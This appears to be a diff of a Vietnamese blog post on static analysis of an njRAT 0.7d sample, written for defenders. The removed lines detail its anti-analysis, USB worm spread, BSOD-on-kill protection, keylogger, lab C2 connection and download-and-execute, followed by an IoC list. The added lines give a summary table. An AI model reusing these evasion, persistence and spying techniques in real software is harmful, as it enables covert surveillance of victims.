-*Hình 17 — Khởi tạo Mutex và kiểm tra cờ flag3.*
-
-Mã độc tạo đối tượng `Mutex` với khóa `OK.RG`. Nếu `flag3 == false` (nghĩa là Mutex này đã tồn tại trên hệ điều hành), nó lập tức gọi `ProjectData.EndApp()` để tự kết thúc, tránh gây chú ý do xung đột tài nguyên.
-
-#### B. Cơ chế Kháng gỡ lỗi và Lây lan Worm qua USB
-
-![Kích hoạt chống phân tích và lây lan qua USB](/assets/images/posts/malware/image33.png)
-*Hình 18 — Luồng CsAntiProcess và vòng lặp lây lan ổ đĩa USB.*
-
-- **Anti-Process**: Kích hoạt luồng `CsAntiProcess.Start()`, liên tục duyệt danh sách tiến trình chạy trên Windows; nếu thấy các tiến trình trong blacklist (như `dnSpy.exe`, `Wireshark.exe`), nó sẽ lập tức ép đóng (kill) chúng.
-- **Worm Spread (Lây lan qua USB)**: Gọi `Directory.GetLogicalDrives()` để duyệt toàn bộ phân vùng ổ đĩa và thiết bị ngoại vi gắn ngoài. Sau đó tự copy chính nó thành tệp `Tools.exe` đặt tại thư mục gốc của các ổ đĩa để lây lan sang các máy tính khác.
-
-#### C. Thăm dò Antivirus qua WMI
-
-![Hàm GetAntiVirus truy vấn WMI](/assets/images/posts/malware/image34.png)
-*Hình 19 — Hàm GetAntiVirus() truy vấn WMI namespace SecurityCenter2.*
-
-Logic của hàm `GetAntiVirus()`:
-1. Kết nối vào namespace quản lý bảo mật của Windows: `winmgmts:\\.\root\SecurityCenter2`.
-2. Chạy câu truy vấn: `Select * from AntiVirusProduct`.
-3. Duyệt thuộc tính `displayName` của kết quả để lấy tên Antivirus (ví dụ Windows Defender, Kaspersky).
-4. Nếu không có phần mềm diệt virus nào, trả về chuỗi mặc định `"No AV"` để chuyển tiếp về máy chủ C2.
-
-#### D. Cơ chế Chống Tắt Tiến Trình (Anti-Kill gây BSOD)
-
-![Đăng ký chống tắt tiến trình](/assets/images/posts/malware/image36.png)
-*Hình 20 — Bắt sự kiện SessionEnding và gọi NtSetInformationProcess.*
-
-Đây là một trong những cơ chế phá hoại hung hãn nhất của njRAT:
-- Mã độc đăng ký bắt sự kiện người dùng kết thúc phiên (`SessionEnding`).
-- Hàm `OK.pr(1)` gọi API `NtSetInformationProcess` của `ntdll.dll` để đặt cờ `BreakOnTermination`, biến tiến trình njRAT thành **Critical System Process**.
-- Nếu người dùng hoặc chuyên viên bảo mật cố tình dùng Task Manager để "End Task" tiến trình này, nhân Windows sẽ lập tức sụp đổ với lỗi **Màn hình xanh chết chóc (BSOD)**!
-
-#### E. Cơ chế Thu nhỏ RAM và Tự bảo vệ Registry Run
-
-![Vòng lặp giám sát bảo vệ Registry và ép giảm RAM](/assets/images/posts/malware/image37.png)
-*Hình 21 — Định kỳ ép giảm dung lượng RAM sử dụng và bảo vệ khóa Registry Run.*
-
-- **Lẩn trốn Task Manager**: Cứ mỗi 5 giây, mã độc gọi `MinWorkingSet = (IntPtr)1024`, ép Windows thu hồi bộ nhớ RAM vật lý của tiến trình xuống mức tối thiểu nhằm tránh lọt vào top các ứng dụng tốn tài nguyên trên Task Manager.
-- **Bảo vệ khóa Run**: Liên tục kiểm tra khóa Registry tự khởi động; nếu khóa bị xóa hoặc chỉnh sửa, mã độc lập tức tạo lại ngay lập tức.
-- **Báo cáo cửa sổ**: Cứ mỗi 8 giây, lấy tiêu đề cửa sổ đang hoạt động qua `OK.ACT()` và gửi về C2 với tiền tố `"act"`.
-
-#### F. Module Gián Điệp Bàn Phím (Keylogger) và Theo Dõi Cửa Sổ
-
-![Hàm WRK Module Keylogger](/assets/images/posts/malware/image38.png)
-*Hình 22 — Vòng lặp bắt phím bằng GetAsyncKeyState trong hàm WRK().*
-
-Hàm `WRK()` (Worker) thể hiện kiến trúc Keylogger ngầm:
-1. Dùng vòng lặp quét mã phím từ `0` đến `255`, gọi API `GetAsyncKeyState(num2) == -32767` để nhận diện phím vừa được nhấn xuống.
-2. Gọi hàm `AV()` để gắn ngữ cảnh tiêu đề cửa sổ ứng dụng mà người dùng đang thao tác trước các ký tự phím.
-3. Giới hạn bộ đệm: Nếu log phím vượt quá **20 KB** (`20 * 1024` ký tự), mã độc tự động cắt tỉa phần cũ nhất và ghi đè nội dung mới vào Registry để lưu trữ tạm thời.
-4. Chèn `Thread.Sleep(1)` sau mỗi vòng quét để tối ưu CPU, giữ cho máy nạn nhân không bị giật lag.
-
-![Hàm AV Module Active Window](/assets/images/posts/malware/image39.png)
-*Hình 23 — Hàm AV() gắn nhãn bối cảnh cửa sổ ứng dụng vào log phím.*
-
-Hàm `AV()` (Active View) gọi API `GetForegroundWindow()` và `GetWindowThreadProcessId` để lấy tên tiến trình cùng tiêu đề cửa sổ (`MainWindowTitle`). Chuỗi bối cảnh gồm thời gian, tên tiến trình và tiêu đề cửa sổ được đóng gói với ký tự phân tách đặc biệt `\u0001` trước khi gắn vào nhật ký gõ phím.
-
-#### G. Giao thức Mạng C2 và Thực Thi Lệnh Từ Xa
-
-![Hàm connect mở socket TCP](/assets/images/posts/malware/image40.png)
-*Hình 24 — Hàm connect() thiết lập socket TCP và gửi thông điệp nhận diện inf.*
-
-Hàm `connect()` khởi tạo đối tượng `TcpClient`, kết nối trực tiếp đến IP `172.20.0.20` trên cổng `1177`. Ngay khi bắt tay thành công, nó gom thông tin hệ thống (OS, webcam, antivirus, thư mục cài đặt) qua hàm `OK.inf()`, mã hóa Base64 và truyền đi với header `"inf"`.
-
-![Xử lý lệnh Ind](/assets/images/posts/malware/image41.png)
-*Hình 25 — Hàm gửi toàn bộ log Keylogger đã lưu về máy chủ C2.*
-
-![Tải và thực thi tệp từ xa](/assets/images/posts/malware/image42.png)
-*Hình 26 — Logic nhận mảng byte hoặc tải file qua URL rồi kích hoạt tiến trình mới.*
-
-Hàm `Ind()` phân tách và xử lý các chỉ thị từ kẻ tấn công:
-- **Lấy log bàn phím**: Đọc toàn bộ `OK.kq.Logs`, mã hóa Base64 gửi về hacker.
-- **Tải và thực thi (Download & Execute)**: Nhận mảng byte nén (giải nén qua `OK.ZIP`) hoặc dùng `WebClient.DownloadData` tải payload mới từ Internet lưu vào `%TEMP%` rồi kích hoạt bằng `Process.Start()`.
-
-![Chụp ảnh màn hình có so sánh băm MD5](/assets/images/posts/malware/image43.png)
-*Hình 27 — Chức năng chụp màn hình nén JPEG và kiểm tra trùng lặp bằng MD5.*
-
-- **Tối ưu băng thông**: Hàm chụp màn hình sử dụng `CopyFromScreen`, nén ảnh dưới chuẩn JPEG, sau đó **tính mã băm MD5** so sánh với ảnh cũ. Mã độc chỉ gửi ảnh về C2 nếu màn hình nạn nhân có sự thay đổi thực sự!
-
-![Cập nhật và gỡ bỏ mã độc](/assets/images/posts/malware/image44.png)
-*Hình 28 — Lệnh cập nhật phiên bản RAT mới từ xa.*
-
-- **Cập nhật & Tự hủy**: Tải bản update mới về thư mục `%TEMP%`, kích hoạt bản mới và gọi `OK.UNS()` để gỡ bỏ phiên bản cũ khỏi hệ thống.
-
----
-
-## 4. Tổng Kết Phát Hiện và Bảng Chỉ Báo Thỏa Hiệp (IoCs)
-
-### 4.1. Đối chiếu từ Giả thuyết (Tĩnh cơ bản) đến Khẳng định (Tĩnh nâng cao)
-
-| Thành phần | Giả thuyết từ Phân tích tĩnh cơ bản | Khẳng định từ Phân tích tĩnh nâng cao (dnSpy & FLOSS) |
-|---|---|---|
-| **C2 Server** | Thấy IP `172.20.0.20` trong chuỗi tĩnh | Xác nhận IP `172.20.0.20`, cổng `1177`, Campaign ID `Y262SUCZ4UJJ`, Victim ID `victim_01` |
-| **Tránh trùng lặp** | Không xác định được | Sử dụng Mutex `406d3456f0ada99f8c6ea81e98985830` |
-| **Phát hiện Antivirus** | Phát hiện truy vấn WMI `AntiVirusProduct` | Hàm `GetAntiVirus()` đọc `displayName`, nếu không có trả về `"No AV"` gửi về C2 |
-| **Chống tắt tiến trình** | Thấy API `NtSetInformationProcess` | Biến thành Critical Process; kích hoạt gây **BSOD** nếu bị tắt bằng Task Manager |
-| **Keylogger** | Thấy `GetAsyncKeyState`, `MapVirtualKey` | Hàm `WRK()` bắt phím, gắn tiêu đề `AV()`, giới hạn bộ đệm 20KB, lưu tạm Registry |
-| **Chụp màn hình** | Thấy thư viện `System.Drawing` | Chụp màn hình nén JPEG kèm **so sánh MD5** để tối ưu lưu lượng mạng |
-| **Lây lan ngoại vi** | Không phát hiện được qua IAT | Module Worm tự copy thành `Tools.exe` vào thư mục gốc của tất cả ổ đĩa và USB |
-
----
-
-### 4.2. Bảng Chỉ Báo Thỏa Hiệp Hoàn Chỉnh (IoCs)
-
-Dưới đây là bộ IoCs hoàn chỉnh được trích xuất từ quá trình phân tích tĩnh, sẵn sàng phục vụ cho việc tạo SIEM Detection Rules, YARA Rules và cấu hình Firewall:
-
-```text
-[ FILE HASHES ]
-MD5:    c35fdeebdede1d3a555e05209e61bb73
-SHA256: d1b368392d8143ba7038493570f34c994018cc46855918e3022085de32f6b653
-
-[ NETWORK INDICATORS ]
-C2 Server IP: 172.20.0.20
-C2 Port:      1177 (TCP)
-Traffic Type: Plaintext / Custom protocol with delimited tokens (, [kl])
-
-[ HOST INDICATORS ]
-Mutex:              406d3456f0ada99f8c6ea81e98985830
-Registry Run Key:   HKCU\Software\Microsoft\Windows\CurrentVersion\Run -> "server.exe"
-Environment Var:    SEE_MASK_NOZONECHECKS = "1"
-Worm File Dropped:  <DriveLetter>:\Tools.exe
-Temp Executables:   %TEMP%\*.exe
-
-[ WMI QUERIES ]
-Namespace: root\SecurityCenter2
-Query:     SELECT * FROM AntiVirusProduct
-```
-
----
-
-## 5. Kết Luận
-
-Phương pháp **phân tích tĩnh kết hợp (Basic + Advanced Static Analysis)** đã chứng minh sức mạnh vượt trội khi giải mã hoàn toàn mẫu mã độc gián điệp **njRAT 0.7d**:
-1. Không cần thực thi mẫu độc hại trong môi trường động, chúng ta vẫn bóc tách được toàn bộ cấu trúc mã nguồn, cấu hình C2, port lắng nghe và các khóa Mutex/Registry bí mật.
-2. Hiểu rõ bản chất từng module giúp đội ngũ Blue Team và SOC Analyst chủ động xây dựng quy tắc phòng thủ (YARA rules, Sigma rules, IDS signatures) chính xác tuyệt đối mà không lo bỏ sót các nhánh rẽ điều kiện ẩn sâu trong code.
+| **Tên tệp ban đầu** | `malware_blt.exe` (Module gốc: `Stub.exe`) |
+| **Kích thước** | `32.768 bytes` (~32 KB) |
+| **Loại tệp** | PE32 Executable, Microsoft Visual Basic .NET |
+| **C2 Server (Lab)** | `172.20.0.20:1177` (Giao thức TCP thô) |
+| **Tên Mutex** | Lấy từ biến cấu hình `OK.RG` |
+| **Vị trí Persistence** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
+| **Tên tệp ngụy trang** | `WindowsServices.exe` (Sao chép vào User Profile) |
+| **Các API nhạy cảm** | `GetAsyncKeyState`, `GetKeyboardState`, `GetForegroundWindow` |
+| **Cơ chế thu thập** | Giám sát phím gõ có gắn kèm Window Title; Chụp màn hình so khớp MD5 |
+| **Truy vấn WMI** | `Select * From AntiVirusProduct` |
+
+### 6.3. Những gì có thể kết luận từ mã nguồn
+
+Từ một file thực thi nhỏ bé 32 KB, quá trình phân tích tĩnh đã dẫn mình qua một chuỗi logic chặt chẽ và nhất quán:
+1. Nhận diện kiến trúc .NET giúp chọn đúng công cụ dịch ngược dnSpy.
+2. Các API bàn phím dẫn thẳng tới vòng lặp bắt phím và bộ đệm nhật ký trong hàm `WRK()`.
+3. Chuỗi Registry Run và tên `WindowsServices.exe` dẫn tới cơ chế bám trụ trong hàm `INS()`.
+4. Cấu hình IP/Port dẫn tới đối tượng `TcpClient` thực hiện kết nối C2 chủ động.
+5. Nhánh `DownloadData` và `Process.Start` làm rõ khả năng tải và chạy payload thứ cấp theo lệnh.
+
+Việc đọc trực tiếp mã nguồn dịch ngược không chỉ giúp mình khẳng định chính xác nhãn nhận diện **njRAT 0.7d**, mà quan trọng hơn là hiểu rõ **cách mã độc được thiết kế, vận hành và che giấu danh tính** trên hệ điều hành Windows.
